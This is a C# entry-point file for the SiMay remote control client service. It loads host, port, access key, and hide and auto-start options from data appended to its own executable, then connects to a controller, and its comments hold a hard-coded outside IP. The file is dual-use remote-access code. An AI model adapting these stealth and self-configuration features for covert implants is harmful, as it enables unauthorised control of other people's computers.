using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using SiMay.Core;
using System.Net.Sockets;
using System.Diagnostics;
using SiMay.Sockets.Tcp.Client;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Delegate;
using System.Text;
using SiMay.Core.Entitys;
using SiMay.Serialize;
using SiMay.Basic;

namespace SiMay.ServiceCore
{
    public class StartParameterEx
    {
        public string UniqueId { get; set; }
        public string Host { get; set; }
        public int Port { get; set; }
        public string RemarkInformation { get; set; }
        public string GroupName { get; set; }
        public bool IsAutoStart { get; set; }
        public bool IsHide { get; set; }
        public int SessionMode { get; set; }
        public long AccessKey { get; set; }
        public bool IsMutex { get; set; }
        public string ServiceVersion { get; set; }
        public string RunTimeText { get; set; }
    }
    static class Program
    {
        //static string ip = "94.191.115.121";
        //static int port = 522;

        //static string _host = "127.0.0.1";
        //static int _port = 5200;

        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            //string host = "127.0.0.1";
            //int port = 5200;
            //host = "94.191.115.121";
            //port = 522;
            //string remarkInformation = "";//初始化备注信息
            //string groupName = "默认分组";
            //bool isAutoStart = false;
            //bool isHide = false;
            //int sessionMode = 1;//服务器模式 //1是中间服务器模式
            //int accesskey = 5200;//初始连接密码
            //string id = "AAAAAAAAAAA11111111";
            //bool isMutex = false;

            var startParameter = new StartParameterEx()
            {
                Host = "127.0.0.1",
                Port = 5200,
                GroupName = "默认分组",
                RemarkInformation = "SiMayService",
                IsHide = false,
                IsMutex = false,
                IsAutoStart = false,
                SessionMode = 0,
                AccessKey = 5200,
                ServiceVersion = "正式5.0",
                RunTimeText = DateTime.Now.ToString(),
                UniqueId = "AAAAAAAAAAAAAAA11111111"
            };
            try
            {
                byte[] binary = File.ReadAllBytes(Application.ExecutablePath);
                var sign = BitConverter.ToInt16(binary, binary.Length - sizeof(Int16));
                if (sign == 9999)
                {
                    var length = BitConverter.ToInt32(binary, binary.Length - sizeof(Int16) - sizeof(Int32));
                    byte[] bytes = new byte[length];
                    Array.Copy(binary, binary.Length - sizeof(Int16) - sizeof(Int32) - length, bytes, 0, length);

                    var options = PacketSerializeHelper.DeserializePacket<ServiceOptions>(bytes);
                    startParameter.Host = options.Host;
                    startParameter.Port = options.Port;
                    startParameter.RemarkInformation = options.Remark;
                    startParameter.IsAutoStart = options.IsAutoRun;
                    startParameter.IsHide = options.IsHide;
                    startParameter.AccessKey = options.AccessKey;
                    startParameter.SessionMode = options.SessionMode;
                    startParameter.UniqueId = options.Id;
                    startParameter.IsMutex = options.IsMutex;
                    startParameter.GroupName = options.GroupName;
                    //= lpport;
                }
            }
            catch { }

            if (startParameter.IsMutex)
            {
                //进程互斥体
                bool bExist;
                Mutex MyMutex = new Mutex(true, "SiMayService", out bExist);
                if (!bExist)
                    Environment.Exit(0);
            }


            //while (true) //第一次解析域名,直至解析成功
            //{
            //    var ip = IPHelper.GetHostByName(host);
            //    if (ip != null)
            //    {
            //        AppConfiguartion.ServerIPEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            //        break;
            //    }

            //    Console.WriteLine(host ?? "address analysis is null");

            //    Thread.Sleep(5000);
            //}
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            Application.ThreadException += Application_ThreadException;


            try
            {
                new MainService.MainService(startParameter);
            }
            catch (Exception ex)
            {
                WriteException("main service exception!", ex);
            }
            SystemMessageNotify.InitializeNotifyIcon();
            SystemMessageNotify.ShowTip("SiMay远程控制被控服务已启动!");
            Application.Run();
        }

        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
            => WriteException("main thread exception!", e.Exception);

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
            => WriteException("thread exception!", e.ExceptionObject as Exception);

        private static void WriteException(string msg, Exception ex)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine(msg);
            sb.Append(ex.Message);
            sb.Append(ex.StackTrace);

            LogHelper.WriteErrorByCurrentMethod(sb.ToString());
#if DEBUG
            if (File.Exists("SiMaylog.log"))
                File.SetAttributes("SiMaylog.log", FileAttributes.Hidden);
#endif
        }


    }
}
